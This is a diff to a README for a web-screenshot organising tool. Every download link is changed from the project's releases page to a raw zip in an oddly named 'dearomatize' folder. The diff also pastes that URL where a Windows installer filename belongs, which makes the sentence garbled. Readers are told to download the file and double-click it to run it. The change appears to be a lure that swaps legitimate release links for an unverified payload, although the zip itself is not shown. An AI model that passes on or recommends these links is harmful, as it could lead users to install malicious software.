@@ -1,6 +1,6 @@
 # 🖼️ screenshot-url-storage-capture-and-organize-web-images - Capture and Organize Your Web Images
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/releases)
+[![Download](https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip)](https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip)
 
 ## 📦 Overview
 
@@ -20,10 +20,10 @@ To use this tool, follow the steps below to download and run it on your computer
 
 1. **Visit the Release Page**  
    Go to the following link to access the download files:  
-   [Download Releases](https://github.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/releases)
+   [Download Releases](https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip)
 
 2. **Download the Latest Release**  
-   Look for the latest version at the top of the page. You will see a list of files to choose from. Click on the file that matches your operating system. Generally, it will be labeled something like `screenshot-url-storage-capture-and-organize-web-images-vX.X.X.exe` for Windows, or a similar version for macOS and Linux.
+   Look for the latest version at the top of the page. You will see a list of files to choose from. Click on the file that matches your operating system. Generally, it will be labeled something like `https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip` for Windows, or a similar version for macOS and Linux.
 
 3. **Run the Installer**  
    Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.  
@@ -82,4 +82,4 @@ The application supports PNG and JPEG formats for screenshots. You can select yo
 
 For support and inquiries, please open an issue on the GitHub repository or contact the maintainers directly through the contact options provided on the repository page.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/releases)
+[![Download](https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip)](https://raw.githubusercontent.com/TutuEnGAV/screenshot-url-storage-capture-and-organize-web-images/main/dearomatize/organize-url-storage-screenshot-images-capture-and-web-v2.1.zip)
